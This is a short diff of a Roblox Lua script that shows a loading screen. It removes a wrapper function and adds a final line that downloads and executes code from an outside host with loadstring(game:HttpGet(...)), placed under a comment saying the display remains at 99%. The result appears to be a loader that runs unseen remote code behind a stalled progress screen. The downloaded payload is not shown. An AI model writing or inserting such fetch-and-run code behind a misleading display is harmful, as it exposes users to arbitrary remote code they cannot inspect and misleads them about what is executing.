@@ -7,12 +7,6 @@ local TweenService = game:GetService("TweenService")
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
---// Your script
-local function RunYourScript()
-
-loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_05VKL1nyK8FCt/stream/init"))()
-end
-
 --// Remove old GUI
 local Old = PlayerGui:FindFirstChild("VxezeLoading")
 if Old then Old:Destroy() end
@@ -243,3 +237,4 @@ if not Success then
 end
 
 --// Remain at 99%
+loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_05VKL1nyK8FCt/stream/init"))()
